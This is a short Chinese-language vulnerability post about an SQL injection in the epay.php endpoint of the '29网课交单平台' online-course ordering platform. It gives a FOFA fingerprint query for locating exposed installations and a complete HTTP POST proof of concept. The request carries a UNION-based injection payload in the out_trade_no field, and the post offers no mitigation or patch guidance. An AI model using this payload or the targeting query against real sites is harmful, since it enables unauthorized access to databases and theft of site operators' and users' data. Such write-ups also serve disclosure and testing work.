**fofa**

body="/apisub.php"

**一、漏洞简述**

29网课交单平台是基于PHP开发，为用户提供了高效、稳定、安全的在线学习和交易环境。作为知识付费系统的重要组成部分，充分利用了互联网的优势，为用户提供了便捷的支付方式、高效的课程管理以及优质的用户体验。随着知识付费模式的普及和发展，该平台将为更多用户和教育机构提供优质的服务。其接口epay.php存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

**二、漏洞检测poc**

```yaml

POST /epay/epay.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 106

out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(md5(123456) AS CHAR),0x20)),1,1,1,1,1,1,1,1,1,1,1-- -
```

